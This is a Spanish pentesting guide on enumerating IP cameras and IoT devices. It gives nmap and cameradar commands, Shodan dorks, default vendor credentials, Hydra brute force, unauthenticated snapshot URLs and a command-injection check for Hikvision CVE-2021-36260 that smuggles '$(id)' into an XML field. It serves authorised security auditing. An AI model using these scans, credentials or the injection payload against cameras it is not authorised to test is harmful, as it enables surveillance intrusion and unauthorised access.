---
icon: building-magnifying-glass
---

# Enumeración de dispositivos IoT

## Enumeración de Cámaras IP y Dispositivos IoT

Los dispositivos IoT — cámaras IP, DVRs, NVRs, sistemas de control industrial — son objetivos frecuentes en auditorías de infraestructura por varias razones: firmware desactualizado, credenciales por defecto nunca cambiadas, interfaces web con vulnerabilidades conocidas y protocolos de streaming expuestos sin autenticación. Este tipo de dispositivos raramente recibe el mismo nivel de hardening que un servidor convencional.

### Protocolos principales

| Protocolo        | Puerto               | Descripción                                                            |
| ---------------- | -------------------- | ---------------------------------------------------------------------- |
| **RTSP**         | TCP 554 / 8554       | Real Time Streaming Protocol — streaming de vídeo/audio en tiempo real |
| **RTMP**         | TCP 1935             | Real-Time Messaging Protocol — streaming Flash/multimedia              |
| **HTTP**         | TCP 80 / 8080 / 8081 | Panel de administración web del dispositivo                            |
| **HTTPS**        | TCP 443 / 8443       | Panel de administración web cifrado                                    |
| **ONVIF**        | TCP 80 / 8080        | Estándar de interoperabilidad para cámaras IP (sobre HTTP/SOAP)        |
| **PSIA**         | TCP 80               | Physical Security Interoperability Alliance — alternativa a ONVIF      |
| **RTP**          | UDP dinámico         | Real-time Transport Protocol — transporte del stream de vídeo          |
| **mDNS/Bonjour** | UDP 5353             | Autodescubrimiento de dispositivos en red local                        |
| **UPnP**         | UDP 1900             | Universal Plug and Play — autodescubrimiento y configuración           |
| **Telnet**       | TCP 23               | Acceso remoto legacy, frecuente en firmware antiguo                    |
| **SSH**          | TCP 22               | Acceso remoto en dispositivos más modernos                             |

### Descubrimiento con Nmap

```bash
# Escaneo de puertos típicos de cámaras IP en la red
nmap -sV -p 554,8554,80,8080,8081,443,8443,1935,23,22 192.168.1.0/24

# Scripts NSE específicos para RTSP
nmap -p 554 --script rtsp-url-brute 192.168.1.100
nmap -p 554 --script rtsp-methods 192.168.1.100

# Descubrimiento UPnP en red local
nmap -sU -p 1900 --script upnp-info 192.168.1.0/24

# Escaneo agresivo de servicios en rango de puertos web habituales
nmap -sV -p 80,81,82,443,554,888,8080,8081,8082,8443,8554,9000 192.168.1.0/24
```

### Enumeración RTSP

RTSP (RFC 2326) es el protocolo estándar para streaming de vídeo en cámaras IP. La URL de stream suele seguir patrones predecibles según el fabricante.

#### Estructura de una URL RTSP

```
rtsp://[usuario:contraseña@]ip:puerto/ruta
rtsp://admin:admin@192.168.1.100:554/stream1
rtsp://192.168.1.100:554/live/ch00_0
```

#### Rutas RTSP por fabricante

| Fabricante | URL RTSP típica                                            |
| ---------- | ---------------------------------------------------------- |
| Hikvision  | `/Streaming/Channels/101`                                  |
| Dahua      | `/cam/realmonitor?channel=1&subtype=0`                     |
| Axis       | `/axis-media/media.amp`                                    |
| Bosch      | `/rtsp_tunnel`                                             |
| Sony       | `/media/video1`                                            |
| Foscam     | `/videoMain`                                               |
| Generic    | `/live`, `/stream`, `/video`, `/h264`, `/stream1`, `/ch01` |

#### Fuerza bruta de rutas RTSP

```bash
# cameradar — herramienta específica para RTSP brute-force
docker run -t ullaakut/cameradar -t 192.168.1.100
docker run -t ullaakut/cameradar -t 192.168.1.0/24 -p 554,8554

# Con credenciales personalizadas
docker run -t ullaakut/cameradar -t 192.168.1.100 \
  --credentials /tmp/creds.json

# rtsp-brute manual con curl
curl -v rtsp://192.168.1.100:554/live --user admin:admin

# Acceder al stream con ffmpeg (verifica que el stream es accesible)
ffmpeg -i rtsp://192.168.1.100:554/Streaming/Channels/101 -vframes 1 captura.jpg

# Con VLC para visualización directa
vlc rtsp://192.168.1.100:554/live
```

#### Herramienta: cvedetails / iSpy

`iSpy` mantiene una base de datos de URLs RTSP por modelo de cámara. También disponible en `ispyconnect.com/cameras`.

### ONVIF — enumeración del estándar

ONVIF es un protocolo SOAP/HTTP que permite descubrir y controlar cámaras de forma estandarizada: obtener perfiles, URLs de stream, mover PTZ, etc.

```bash
# Descubrimiento ONVIF en red local (WS-Discovery)
pip install onvif-zeep
python3 -c "
from wsdiscovery.discovery import ThreadedWSDiscovery as WSDiscovery
wsd = WSDiscovery()
wsd.start()
services = wsd.searchServices()
for s in services:
    print(s.getXAddrs())
wsd.stop()
"

# onvif-cli — herramienta de línea de comandos
pip install onvif-cli
onvif-cli devicemgmt GetDeviceInformation --host 192.168.1.100 --user admin --password admin

# Obtener URLs de stream ONVIF
onvif-cli media GetProfiles --host 192.168.1.100 --user admin --password admin
onvif-cli media GetStreamUri --host 192.168.1.100 --user admin --password admin
```

### Búsqueda en Shodan

Shodan indexa dispositivos expuestos en internet, incluyendo paneles de cámaras y streams RTSP abiertos. En un pentest con alcance de reconocimiento externo:

```
# Dorks de Shodan para cámaras
port:554 has_screenshot:true
port:554 product:"RTSP"
http.title:"Network Camera" country:"ES"
http.title:"DVR" port:80
http.title:"IP Camera" 200 OK
"Server: Hikvision" port:80
"Hikvision" port:554
"Dahua" port:554
"Authorization: Digest" port:554
```

```bash
# Con shodan CLI
shodan search 'port:554 "RTSP" country:ES' --fields ip_str,port,org
shodan search 'http.title:"Network Camera"' --fields ip_str,port,org,hostname
```

> Shodan solo es válido en contextos de reconocimiento sobre activos del cliente o en bug bounty con alcance definido. Acceder a dispositivos que no sean del cliente es ilegal independientemente de que estén expuestos públicamente.

### Paneles de administración web

Las cámaras IP incluyen una interfaz web de gestión. Los puertos más comunes son 80, 8080, 8081 y 443.

```bash
# Descubrimiento masivo de paneles web con whatweb
whatweb 192.168.1.0/24 -p 80,8080,8081,443,8443

# Con httpx
httpx -l hosts.txt -ports 80,8080,8081,443,8443 -title -status-code -tech-detect

# Con eyewitness — captura screenshots de paneles web
eyewitness --web -f hosts.txt --ports 80,8080,443,8443
```

### Credenciales por defecto — cámaras IP

La mayoría de dispositivos salen de fábrica con credenciales conocidas que raramente se cambian:

| Fabricante  | Usuario   | Contraseña                   |
| ----------- | --------- | ---------------------------- |
| Hikvision   | `admin`   | `12345` / `Admin1234`        |
| Dahua       | `admin`   | `admin`                      |
| Axis        | `root`    | `pass` / `root`              |
| Foscam      | `admin`   | `""` (vacía)                 |
| Bosch       | `service` | `service`                    |
| Samsung     | `admin`   | `4321`                       |
| Sony        | `admin`   | `admin`                      |
| Vivotek     | `root`    | `""` (vacía)                 |
| Generic DVR | `admin`   | `1234` / `888888` / `666666` |

Recursos de referencia:

* `https://www.defaultpassword.com`
* SecLists: `Passwords/Default-Credentials/`
* `https://ipvm.com/reports/ip-cam-default-passwords`

```bash
# Fuerza bruta de panel web de cámara con Hydra
hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  192.168.1.100 http-get /

# Panel con autenticación Digest (habitual en cámaras)
curl -v --digest -u admin:admin http://192.168.1.100/cgi-bin/snapshot.cgi
```

### Vulnerabilidades conocidas frecuentes

#### Hikvision — RCE sin autenticación (CVE-2021-36260)

Una de las vulnerabilidades más explotadas en cámaras. Permite ejecución de comandos sin credenciales mediante una petición PUT malformada al endpoint `/SDK/webLanguage`:

```bash
# Verificación de vulnerabilidad (no explotación)
curl -s "http://192.168.1.100/SDK/webLanguage" \
  -X PUT -d '<?xml version="1.0"?><language>$(id)</language>'
```

#### Dahua — bypass de autenticación (CVE-2021-33044)

Permite omitir la autenticación del panel de gestión manipulando el proceso de login.

#### Acceso a snapshot sin autenticación

Muchos modelos exponen endpoints de captura de imagen sin requerir login:

```bash
# Rutas habituales de snapshot sin autenticación
curl http://192.168.1.100/snapshot.jpg
curl http://192.168.1.100/cgi-bin/snapshot.cgi
curl http://192.168.1.100/image/jpeg.cgi
curl http://192.168.1.100/onvifsnapshot/media_service/snapshot?channel=1
```

### Herramientas de referencia

| Herramienta   | Función                                              |
| ------------- | ---------------------------------------------------- |
| `cameradar`   | RTSP discovery + brute-force de rutas y credenciales |
| `ibrute`      | Brute-force específico para cámaras IP               |
| `onvif-cli`   | Interacción con dispositivos ONVIF                   |
| `ffmpeg`      | Verificar y capturar frames de streams RTSP          |
| `vlc`         | Visualizar streams RTSP                              |
| `shodan-cli`  | Búsqueda de dispositivos expuestos en internet       |
| `eyewitness`  | Screenshots masivos de paneles web                   |
| `nmap rtsp-*` | Scripts NSE para enumeración RTSP                    |

> En auditorías de red interna, lanzar un `nmap -sV -p 554,8554,80,8080` sobre toda la subred y cruzar los resultados con Shodan para los IPs externos del cliente suele revelar cámaras expuestas tanto internamente como desde internet — frecuentemente con las mismas credenciales por defecto.
